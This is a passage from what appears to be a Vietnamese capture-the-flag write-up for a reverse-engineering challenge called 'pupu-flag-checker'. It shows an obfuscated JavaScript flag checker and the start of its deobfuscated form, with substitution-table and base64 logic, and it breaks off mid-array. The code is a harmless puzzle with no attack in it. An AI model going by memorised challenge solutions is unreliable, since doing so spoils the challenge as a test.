style="color:#960050;background-color:#1e0010">&#39;</span>push<span style="color:#960050;background-color:#1e0010">&#39;</span>](_0x1bc71f[<span style="color:#960050;background-color:#1e0010">&#39;</span>shift<span style="color:#960050;background-color:#1e0010">&#39;</span>]());}<span style="color:#a6e22e">catch</span>(_0x20c5ae){_0x1bc71f[<span style="color:#960050;background-color:#1e0010">&#39;</span>push<span style="color:#960050;background-color:#1e0010">&#39;</span>](_0x1bc71f[<span style="color:#960050;background-color:#1e0010">&#39;</span>shift<span style="color:#960050;background-color:#1e0010">&#39;</span>]());}}}(_0x16be,<span style="color:#ae81ff">0xedeb9</span>));function <span style="color:#a6e22e">getRandomInt</span>(_0x35fac5,_0x501f88){<span style="color:#66d9ef">const</span> _0x4edb8c<span style="color:#f92672">=</span>_0x17ea;<span style="color:#66d9ef">return</span> Math[<span style="color:#a6e22e">_0x4edb8c</span>(<span style="color:#ae81ff">0x8a</span>)](Math[<span style="color:#a6e22e">_0x4edb8c</span>(<span style="color:#ae81ff">0x96</span>)]()<span style="color:#f92672">*</span>(_0x501f88<span style="color:#f92672">-</span>_0x35fac5<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1</span>))<span style="color:#f92672">+</span>_0x35fac5;}function <span style="color:#a6e22e">byteArrayToBase64</span>(_0x458f88){<span style="color:#66d9ef">const</span> _0x2bd1a7<span style="color:#f92672">=</span>_0x17ea;let _0x148301<span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#39;&#39;</span>;<span style="color:#66d9ef">for</span>(let _0x5a2524<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0</span>;_0x5a2524<span style="color:#f92672">&lt;</span>_0x458f88[<span style="color:#a6e22e">_0x2bd1a7</span>(<span style="color:#ae81ff">0x8b</span>)];_0x5a2524<span style="color:#f92672">++</span>){_0x148301<span style="color:#f92672">+=</span>String[<span style="color:#a6e22e">_0x2bd1a7</span>(<span style="color:#ae81ff">0x95</span>)](_0x458f88[_0x5a2524]);}<span style="color:#66d9ef">const</span> _0x123abd<span style="color:#f92672">=</span><span style="color:#a6e22e">btoa</span>(_0x148301);<span style="color:#66d9ef">return</span> _0x123abd;}function <span style="color:#a6e22e">_0x17ea</span>(_0x1ef9b6,_0x14509b){<span style="color:#66d9ef">const</span> _0x16be78<span style="color:#f92672">=</span><span style="color:#a6e22e">_0x16be</span>();<span style="color:#66d9ef">return</span> _0x17ea<span style="color:#f92672">=</span><span style="color:#a6e22e">function</span>(_0x17eabc,_0x5afbf3){_0x17eabc<span style="color:#f92672">=</span>_0x17eabc<span style="color:#f92672">-</span><span style="color:#ae81ff">0x84</span>;let _0xe824bb<span style="color:#f92672">=</span>_0x16be78[_0x17eabc];<span style="color:#66d9ef">return</span> _0xe824bb;},<span style="color:#a6e22e">_0x17ea</span>(_0x1ef9b6,_0x14509b);}function <span style="color:#a6e22e">xorStrings</span>(_0x5601ff,_0x11ecad){<span style="color:#66d9ef">const</span> _0x403f41<span style="color:#f92672">=</span>_0x17ea;let _0x3822c6<span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#39;&#39;</span>;<span style="color:#66d9ef">for</span>(let _0x304d5b<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0</span>;_0x304d5b<span style="color:#f92672">&lt;</span>_0x5601ff[<span style="color:#960050;background-color:#1e0010">&#39;</span>length<span style="color:#960050;background-color:#1e0010">&#39;</span>]<span style="color:#f92672">&amp;&amp;</span>_0x304d5b<span style="color:#f92672">&lt;</span>_0x11ecad[<span style="color:#a6e22e">_0x403f41</span>(<span style="color:#ae81ff">0x8b</span>)];_0x304d5b<span style="color:#f92672">++</span>){<span style="color:#66d9ef">const</span> _0x1a8e54<span style="color:#f92672">=</span>_0x5601ff[<span style="color:#960050;background-color:#1e0010">&#39;</span>charCodeAt<span style="color:#960050;background-color:#1e0010">&#39;</span>](_0x304d5b),_0x51cc58<span style="color:#f92672">=</span>_0x11ecad[<span style="color:#960050;background-color:#1e0010">&#39;</span>charCodeAt<span style="color:#960050;background-color:#1e0010">&#39;</span>](_0x304d5b),_0x1d436b<span style="color:#f92672">=</span>_0x1a8e54<span style="color:#f92672">^</span>_0x51cc58;_0x3822c6<span style="color:#f92672">+=</span>String[<span style="color:#a6e22e">_0x403f41</span>(<span style="color:#ae81ff">0x95</span>)](_0x1d436b);}<span style="color:#66d9ef">return</span> _0x3822c6;}function <span style="color:#a6e22e">check</span>(_0x3b37a2){<span style="color:#66d9ef">const</span> _0x452468<span style="color:#f92672">=</span>_0x17ea;var _0x41bc91<span style="color:#f92672">=</span>[<span style="color:#ae81ff">0x63</span>,<span style="color:#ae81ff">0x7c</span>,<span style="color:#ae81ff">0x77</span>,<span style="color:#ae81ff">0x7b</span>,<span style="color:#ae81ff">0xf2</span>,<span style="color:#ae81ff">0x6b</span>,<span style="color:#ae81ff">0x6f</span>,<span style="color:#ae81ff">0xc5</span>,<span style="color:#ae81ff">0x30</span>,<span style="color:#ae81ff">0x1</span>,<span style="color:#ae81ff">0x67</span>,<span style="color:#ae81ff">0x2b</span>,<span style="color:#ae81ff">0xfe</span>,<span style="color:#ae81ff">0xd7</span>,<span style="color:#ae81ff">0xab</span>,<span style="color:#ae81ff">0x76</span>,<span style="color:#ae81ff">0xca</span>,<span style="color:#ae81ff">0x82</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0x7d</span>,<span style="color:#ae81ff">0xfa</span>,<span style="color:#ae81ff">0x59</span>,<span style="color:#ae81ff">0x47</span>,<span style="color:#ae81ff">0xf0</span>,<span style="color:#ae81ff">0xad</span>,<span style="color:#ae81ff">0xd4</span>,<span style="color:#ae81ff">0xa2</span>,<span style="color:#ae81ff">0xaf</span>,<span style="color:#ae81ff">0x9c</span>,<span style="color:#ae81ff">0xa4</span>,<span style="color:#ae81ff">0x72</span>,<span style="color:#ae81ff">0xc0</span>,<span style="color:#ae81ff">0xb7</span>,<span style="color:#ae81ff">0xfd</span>,<span style="color:#ae81ff">0x93</span>,<span style="color:#ae81ff">0x26</span>,<span style="color:#ae81ff">0x36</span>,<span style="color:#ae81ff">0x3f</span>,<span style="color:#ae81ff">0xf7</span>,<span style="color:#ae81ff">0xcc</span>,<span style="color:#ae81ff">0x34</span>,<span style="color:#ae81ff">0xa5</span>,<span style="color:#ae81ff">0xe5</span>,<span style="color:#ae81ff">0xf1</span>,<span style="color:#ae81ff">0x71</span>,<span style="color:#ae81ff">0xd8</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0x15</span>,<span style="color:#ae81ff">0x4</span>,<span style="color:#ae81ff">0xc7</span>,<span style="color:#ae81ff">0x23</span>,<span style="color:#ae81ff">0xc3</span>,<span style="color:#ae81ff">0x18</span>,<span style="color:#ae81ff">0x96</span>,<span style="color:#ae81ff">0x5</span>,<span style="color:#ae81ff">0x9a</span>,<span style="color:#ae81ff">0x7</span>,<span style="color:#ae81ff">0x12</span>,<span style="color:#ae81ff">0x80</span>,<span style="color:#ae81ff">0xe2</span>,<span style="color:#ae81ff">0xeb</span>,<span style="color:#ae81ff">0x27</span>,<span style="color:#ae81ff">0xb2</span>,<span style="color:#ae81ff">0x75</span>,<span style="color:#ae81ff">0x9</span>,<span style="color:#ae81ff">0x83</span>,<span style="color:#ae81ff">0x2c</span>,<span style="color:#ae81ff">0x1a</span>,<span style="color:#ae81ff">0x1b</span>,<span style="color:#ae81ff">0x6e</span>,<span style="color:#ae81ff">0x5a</span>,<span style="color:#ae81ff">0xa0</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0x3b</span>,<span style="color:#ae81ff">0xd6</span>,<span style="color:#ae81ff">0xb3</span>,<span style="color:#ae81ff">0x29</span>,<span style="color:#ae81ff">0xe3</span>,<span style="color:#ae81ff">0x2f</span>,<span style="color:#ae81ff">0x84</span>,<span style="color:#ae81ff">0x53</span>,<span style="color:#ae81ff">0xd1</span>,<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">0xed</span>,<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0xfc</span>,<span style="color:#ae81ff">0xb1</span>,<span style="color:#ae81ff">0x5b</span>,<span style="color:#ae81ff">0x6a</span>,<span style="color:#ae81ff">0xcb</span>,<span style="color:#ae81ff">0xbe</span>,<span style="color:#ae81ff">0x39</span>,<span style="color:#ae81ff">0x4a</span>,<span style="color:#ae81ff">0x4c</span>,<span style="color:#ae81ff">0x58</span>,<span style="color:#ae81ff">0xcf</span>,<span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0xef</span>,<span style="color:#ae81ff">0xaa</span>,<span style="color:#ae81ff">0xfb</span>,<span style="color:#ae81ff">0x43</span>,<span style="color:#ae81ff">0x4d</span>,<span style="color:#ae81ff">0x33</span>,<span style="color:#ae81ff">0x85</span>,<span style="color:#ae81ff">0x45</span>,<span style="color:#ae81ff">0xf9</span>,<span style="color:#ae81ff">0x2</span>,<span style="color:#ae81ff">0x7f</span>,<span style="color:#ae81ff">0x50</span>,<span style="color:#ae81ff">0x3c</span>,<span style="color:#ae81ff">0x9f</span>,<span style="color:#ae81ff">0xa8</span>,<span style="color:#ae81ff">0x51</span>,<span style="color:#ae81ff">0xa3</span>,<span style="color:#ae81ff">0x40</span>,<span style="color:#ae81ff">0x8f</span>,<span style="color:#ae81ff">0x92</span>,<span style="color:#ae81ff">0x9d</span>,<span style="color:#ae81ff">0x38</span>,<span style="color:#ae81ff">0xf5</span>,<span style="color:#ae81ff">0xbc</span>,<span style="color:#ae81ff">0xb6</span>,<span style="color:#ae81ff">0xda</span>,<span style="color:#ae81ff">0x21</span>,<span style="color:#ae81ff">0x10</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xf3</span>,<span style="color:#ae81ff">0xd2</span>,<span style="color:#ae81ff">0xcd</span>,<span style="color:#ae81ff">0xc</span>,<span style="color:#ae81ff">0x13</span>,<span style="color:#ae81ff">0xec</span>,<span style="color:#ae81ff">0x5f</span>,<span style="color:#ae81ff">0x97</span>,<span style="color:#ae81ff">0x44</span>,<span style="color:#ae81ff">0x17</span>,<span style="color:#ae81ff">0xc4</span>,<span style="color:#ae81ff">0xa7</span>,<span style="color:#ae81ff">0x7e</span>,<span style="color:#ae81ff">0x3d</span>,<span style="color:#ae81ff">0x64</span>,<span style="color:#ae81ff">0x5d</span>,<span style="color:#ae81ff">0x19</span>,<span style="color:#ae81ff">0x73</span>,<span style="color:#ae81ff">0x60</span>,<span style="color:#ae81ff">0x81</span>,<span style="color:#ae81ff">0x4f</span>,<span style="color:#ae81ff">0xdc</span>,<span style="color:#ae81ff">0x22</span>,<span style="color:#ae81ff">0x2a</span>,<span style="color:#ae81ff">0x90</span>,<span style="color:#ae81ff">0x88</span>,<span style="color:#ae81ff">0x46</span>,<span style="color:#ae81ff">0xee</span>,<span style="color:#ae81ff">0xb8</span>,<span style="color:#ae81ff">0x14</span>,<span style="color:#ae81ff">0xde</span>,<span style="color:#ae81ff">0x5e</span>,<span style="color:#ae81ff">0xb</span>,<span style="color:#ae81ff">0xdb</span>,<span style="color:#ae81ff">0xe0</span>,<span style="color:#ae81ff">0x32</span>,<span style="color:#ae81ff">0x3a</span>,<span style="color:#ae81ff">0xa</span>,<span style="color:#ae81ff">0x49</span>,<span style="color:#ae81ff">0x6</span>,<span style="color:#ae81ff">0x24</span>,<span style="color:#ae81ff">0x5c</span>,<span style="color:#ae81ff">0xc2</span>,<span style="color:#ae81ff">0xd3</span>,<span style="color:#ae81ff">0xac</span>,<span style="color:#ae81ff">0x62</span>,<span style="color:#ae81ff">0x91</span>,<span style="color:#ae81ff">0x95</span>,<span style="color:#ae81ff">0xe4</span>,<span style="color:#ae81ff">0x79</span>,<span style="color:#ae81ff">0xe7</span>,<span style="color:#ae81ff">0xc8</span>,<span style="color:#ae81ff">0x37</span>,<span style="color:#ae81ff">0x6d</span>,<span style="color:#ae81ff">0x8d</span>,<span style="color:#ae81ff">0xd5</span>,<span style="color:#ae81ff">0x4e</span>,<span style="color:#ae81ff">0xa9</span>,<span style="color:#ae81ff">0x6c</span>,<span style="color:#ae81ff">0x56</span>,<span style="color:#ae81ff">0xf4</span>,<span style="color:#ae81ff">0xea</span>,<span style="color:#ae81ff">0x65</span>,<span style="color:#ae81ff">0x7a</span>,<span style="color:#ae81ff">0xae</span>,<span style="color:#ae81ff">0x8</span>,<span style="color:#ae81ff">0xba</span>,<span style="color:#ae81ff">0x78</span>,<span style="color:#ae81ff">0x25</span>,<span style="color:#ae81ff">0x2e</span>,<span style="color:#ae81ff">0x1c</span>,<span style="color:#ae81ff">0xa6</span>,<span style="color:#ae81ff">0xb4</span>,<span style="color:#ae81ff">0xc6</span>,<span style="color:#ae81ff">0xe8</span>,<span style="color:#ae81ff">0xdd</span>,<span style="color:#ae81ff">0x74</span>,<span style="color:#ae81ff">0x1f</span>,<span style="color:#ae81ff">0x4b</span>,<span style="color:#ae81ff">0xbd</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x8a</span>,<span style="color:#ae81ff">0x70</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0xb5</span>,<span style="color:#ae81ff">0x66</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x3</span>,<span style="color:#ae81ff">0xf6</span>,<span style="color:#ae81ff">0xe</span>,<span style="color:#ae81ff">0x61</span>,<span style="color:#ae81ff">0x35</span>,<span style="color:#ae81ff">0x57</span>,<span style="color:#ae81ff">0xb9</span>,<span style="color:#ae81ff">0x86</span>,<span style="color:#ae81ff">0xc1</span>,<span style="color:#ae81ff">0x1d</span>,<span style="color:#ae81ff">0x9e</span>,<span style="color:#ae81ff">0xe1</span>,<span style="color:#ae81ff">0xf8</span>,<span style="color:#ae81ff">0x98</span>,<span style="color:#ae81ff">0x11</span>,<span style="color:#ae81ff">0x69</span>,<span style="color:#ae81ff">0xd9</span>,<span style="color:#ae81ff">0x8e</span>,<span style="color:#ae81ff">0x94</span>,<span style="color:#ae81ff">0x9b</span>,<span style="color:#ae81ff">0x1e</span>,<span style="color:#ae81ff">0x87</span>,<span style="color:#ae81ff">0xe9</span>,<span style="color:#ae81ff">0xce</span>,<span style="color:#ae81ff">0x55</span>,<span style="color:#ae81ff">0x28</span>,<span style="color:#ae81ff">0xdf</span>,<span style="color:#ae81ff">0x8c</span>,<span style="color:#ae81ff">0xa1</span>,<span style="color:#ae81ff">0x89</span>,<span style="color:#ae81ff">0xd</span>,<span style="color:#ae81ff">0xbf</span>,<span style="color:#ae81ff">0xe6</span>,<span style="color:#ae81ff">0x42</span>,<span style="color:#ae81ff">0x68</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x99</span>,<span style="color:#ae81ff">0x2d</span>,<span style="color:#ae81ff">0xf</span>,<span style="color:#ae81ff">0xb0</span>,<span style="color:#ae81ff">0x54</span>,<span style="color:#ae81ff">0xbb</span>,<span style="color:#ae81ff">0x16</span>];<span style="color:#66d9ef">if</span>(_0x3b37a2[<span style="color:#a6e22e">_0x452468</span>(<span style="color:#ae81ff">0x8b</span>)]<span style="color:#f92672">!=</span><span style="color:#ae81ff">0x2c</span>)<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">alert</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span>Incorrect<span style="color:#960050;background-color:#1e0010">\</span>x20length<span style="color:#f92672">!</span><span style="color:#960050;background-color:#1e0010">&#39;</span>);var _0x2884dc<span style="color:#f92672">=</span>[];<span style="color:#66d9ef">for</span>(let _0x1a57d6<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0</span>;_0x1a57d6<span style="color:#f92672">&lt;</span>_0x3b37a2[<span style="color:#a6e22e">_0x452468</span>(<span style="color:#ae81ff">0x8b</span>)];_0x1a57d6<span style="color:#f92672">++</span>){_0x2884dc[<span style="color:#a6e22e">_0x452468</span>(<span style="color:#ae81ff">0x91</span>)](_0x3b37a2[<span style="color:#a6e22e">_0x452468</span>(<span style="color:#ae81ff">0x85</span>)](_0x1a57d6));}<span style="color:#66d9ef">for</span>(let _0xfc20f8<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0</span>;_0xfc20f8<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x10</span>;_0xfc20f8<span style="color:#f92672">++</span>){<span style="color:#66d9ef">for</span>(let _0x4fadbc<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0</span>;_0x4fadbc<span style="color:#f92672">&lt;</span>_0x3b37a2[<span style="color:#a6e22e">_0x452468</span>(<span style="color:#ae81ff">0x8b</span>)];_0x4fadbc<span style="color:#f92672">++</span>){_0x2884dc[_0x4fadbc]<span style="color:#f92672">=</span>_0x41bc91[_0x2884dc[_0x4fadbc]];}}var _0x45d93e<span style="color:#f92672">=</span><span style="color:#a6e22e">byteArrayToBase64</span>(_0x2884dc);console[<span style="color:#a6e22e">_0x452468</span>(<span style="color:#ae81ff">0x86</span>)](_0x45d93e);<span style="color:#66d9ef">if</span>(_0x45d93e<span style="color:#f92672">!=</span><span style="color:#a6e22e">_0x452468</span>(<span style="color:#ae81ff">0x88</span>))<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">_0x452468</span>(<span style="color:#ae81ff">0x93</span>));<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">_0x452468</span>(<span style="color:#ae81ff">0x8c</span>));}function <span style="color:#a6e22e">_0x16be</span>(){<span style="color:#66d9ef">const</span> _0x4eae3d<span style="color:#f92672">=</span>[<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">1923945</span>aMREui<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#ae81ff">403288</span>ARWAZc<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#ae81ff">522465</span>dRWOJo<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#ae81ff">117</span>AUdDXf<span style="color:#e6db74">&#39;,&#39;</span>push<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#ae81ff">1266878</span>gdaSSP<span style="color:#e6db74">&#39;,&#39;</span>Incorrect<span style="color:#960050;background-color:#1e0010">\</span>x20flag<span style="color:#f92672">!</span><span style="color:#e6db74">&#39;,&#39;</span><span style="color:#ae81ff">4091610</span>cgcMNe<span style="color:#e6db74">&#39;,&#39;</span>fromCharCode<span style="color:#e6db74">&#39;,&#39;</span>random<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#ae81ff">9597917</span>yhcHtu<span style="color:#e6db74">&#39;,&#39;</span>charCodeAt<span style="color:#e6db74">&#39;,&#39;</span>log<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#ae81ff">12</span>qPopiU<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">/</span><span style="color:#ae81ff">52</span>NXNAD7Lui<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span>G7idT7Dbue0L7vkV<span style="color:#f92672">/</span>bDey779tzuwf7c5G7c5HbDZHswUs<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;,&#39;</span><span style="color:#ae81ff">138664</span>SkZbmA<span style="color:#e6db74">&#39;,&#39;</span>floor<span style="color:#e6db74">&#39;,&#39;</span>length<span style="color:#e6db74">&#39;,&#39;</span>Good<span style="color:#960050;background-color:#1e0010">\</span>x20job,<span style="color:#960050;background-color:#1e0010">\</span>x20you<span style="color:#960050;background-color:#1e0010">\</span>x27re<span style="color:#960050;background-color:#1e0010">\</span>x20welcome<span style="color:#f92672">!!</span><span style="color:#960050;background-color:#1e0010">&#39;</span>];_0x16be<span style="color:#f92672">=</span><span style="color:#a6e22e">function</span>(){<span style="color:#66d9ef">return</span> _0x4eae3d;};<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_0x16be</span>();}
</span></span></code></pre></div><p>-&gt; JavaScript Obfuscate</p>
<p>Vậy, mình tiến hành thả đoạn code trên vào tool <a href="https://deobfuscate.relative.im/">deobfuscate</a> này để deobfuscate đoạn code trên.</p>
<p>Mình nhận được output như sau:</p>
<p><a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/pupu-flag-checker/pupu.js">pupu.js</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getRandomInt</span>(<span style="color:#a6e22e">min</span>, <span style="color:#a6e22e">max</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> Math.<span style="color:#a6e22e">floor</span>(Math.<span style="color:#a6e22e">random</span>() <span style="color:#f92672">*</span> (<span style="color:#a6e22e">max</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">min</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)) <span style="color:#f92672">+</span> <span style="color:#a6e22e">min</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">byteArrayToBase64</span>(<span style="color:#a6e22e">data</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">value</span> <span style="color:#f92672">+</span> String.<span style="color:#a6e22e">fromCharCode</span>(<span style="color:#a6e22e">data</span>[<span style="color:#a6e22e">i</span>])
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">base64</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">value</span>)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">base64</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">xorStrings</span>(<span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">key</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">output</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">key</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">$116</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#a6e22e">i</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">$y</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">key</span>.<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#a6e22e">i</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">$118</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">$116</span> <span style="color:#f92672">^</span> <span style="color:#a6e22e">$y</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">output</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">output</span> <span style="color:#f92672">+</span> String.<span style="color:#a6e22e">fromCharCode</span>(<span style="color:#a6e22e">$118</span>)
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">output</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">check</span>(<span style="color:#a6e22e">result</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> window <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">99</span>, <span style="color:#ae81ff">124</span>, <span style="color:#ae81ff">119</span>, <span style="color:#ae81ff">123</span>, <span style="color:#ae81ff">242</span>, <span style="color:#ae81ff">107</span>, <span style="color:#ae81ff">111</span>, <span style="color:#ae81ff">197</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">103</span>, <span style="color:#ae81ff">43</span>, <span style="color:#ae81ff">254</span>, <span style="color:#ae81ff">215</span>, <span style="color:#ae81ff">171</span>, <span style="color:#ae81ff">118</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">202</span>, <span style="color:#ae81ff">130</span>, <span style="color:#ae81ff">201</span>, <span style="color:#ae81ff">125</span>, <span style="color:#ae81ff">250</span>, <span style="color:#ae81ff">89</span>, <span style="color:#ae81ff">71</span>, <span style="color:#ae81ff">240</span>, <span style="color:#ae81ff">173</span>, <span style="color:#ae81ff">212</span>, <span style="color:#ae81ff">162</span>, <span style="color:#ae81ff">175</span>, <span style="color:#ae81ff">156</span>, <span style="color:#ae81ff">164</span>, <span style="color:#ae81ff">114</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">192</span>, <span style="color:#ae81ff">183</span>, <span style="color:#ae81ff">253</span>, <span style="color:#ae81ff">147</span>, <span style="color:#ae81ff">38</span>, <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">247</span>, <span style="color:#ae81ff">204</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">165</span>, <span style="color:#ae81ff">229</span>, <span style="color:#ae81ff">241</span>, <span style="color:#ae81ff">113</span>, <span style="color:#ae81ff">216</span>, <span style="color:#ae81ff">49</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">199</span>, <span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">195</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">150</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">154</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">226</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">178</span>, <span style="color:#ae81ff">117</span>, <span style="color:#ae81ff">9</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">131</span>, <span style="color:#ae81ff">44</span>, <span style="color:#ae81ff">26</span>, <span style="color:#ae81ff">27</span>, <span style="color:#ae81ff">110</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">160</span>, <span style="color:#ae81ff">82</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">214</span>, <span style="color:#ae81ff">179</span>, <span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">227</span>, <span style="color:#ae81ff">47</span>, <span style="color:#ae81ff">132</span>, <span style="color:#ae81ff">83</span>, <span style="color:#ae81ff">209</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">237</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">177</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">106</span>, <span style="color:#ae81ff">203</span>, <span style="color:#ae81ff">190</span>, <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">74</span>, <span style="color:#ae81ff">76</span>, <span style="color:#ae81ff">88</span>, <span style="color:#ae81ff">207</span>, <span style="color:#ae81ff">208</span>, <span style="color:#ae81ff">239</span>, <span style="color:#ae81ff">170</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">251</span>, <span style="color:#ae81ff">67</span>, <span style="color:#ae81ff">77</span>, <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">133</span>, <span style="color:#ae81ff">69</span>, <span style="color:#ae81ff">249</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">127</span>, <span style="color:#ae81ff">80</span>, <span style="color:#ae81ff">60</span>, <span style="color:#ae81ff">159</span>, <span style="color:#ae81ff">168</span>, <span style="color:#ae81ff">81</span>, <span style="color:#ae81ff">163</span>, <span style="color:#ae81ff">64</span>, <span style="color:#ae81ff">143</span>,
